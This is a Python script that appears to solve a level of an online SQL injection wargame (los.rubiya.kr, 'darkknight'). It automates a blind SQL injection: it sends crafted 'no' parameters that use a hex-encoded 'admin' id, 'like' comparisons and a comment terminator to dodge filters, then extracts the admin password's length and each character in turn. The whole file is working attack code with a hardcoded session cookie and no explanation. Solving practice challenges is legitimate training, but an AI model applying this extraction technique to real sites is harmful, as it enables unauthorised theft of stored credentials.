import requests
import string

url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?"
cookie = {'PHPSESSID':'2rgl77o8uqnqe518dolu0tqhsc'}

def pw_length():
    pw_len = 0
    while True:
        pw_len += 1
        query = "no=1 or id like 0x61646d696e and length(pw) like {} %23".format(pw_len)
        print(query)
        res = requests.get(url=url+query,cookies=cookie)
        if "Hello admin" in res.text:
            print("PASSWORD LENGTH : " + str(pw_len))
            break
    return pw_len

def pw_char(pw_len):
    passwd = ""
    for i in range(1, pw_len+1):
        for j in string.printable:
            query = "no=1 or id like 0x61646d696e and ord(mid(pw,{},1)) like {} %23".format(i,ord(j))
            print(query)
            res = requests.get(url=url+query, cookies=cookie)
            if "Hello admin" in res.text:
                print("PASSWORD CHAR : " + j)
                passwd += j
                break
    print("PASSWORD : " + passwd)

if __name__ == "__main__":
    pw_len = pw_length()
    pw_char(pw_len)